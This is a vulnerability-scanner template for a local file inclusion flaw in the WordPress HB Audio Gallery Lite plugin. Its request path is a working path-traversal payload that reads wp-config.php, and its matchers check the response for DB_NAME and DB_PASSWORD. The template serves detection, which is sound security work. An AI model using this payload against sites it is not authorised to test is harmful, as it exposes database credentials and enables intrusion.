id: "hb-audio-lfi"
name: "Wordpress HB Audio Gallery Lite - Local File Inclusion"
severity: "high"
description: "Wordpress HB Audio Gallery Lite is vulnerable to local file inclusion."
tech:
  - "wordpress"
  - "php"
tags:
  - "wp"
  - "packetstorm"
  - "wordpress"
  - "wp-plugin"
  - "lfi"
  - "vuln"
reference: "https://packetstormsecurity.com/files/136340/WordPress-HB-Audio-Gallery-Lite-1.0.0-Arbitrary-File-Download.html"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "DB_NAME"
      - "DB_PASSWORD"
    condition: "and"
  - type: "status"
    status:
      - 200
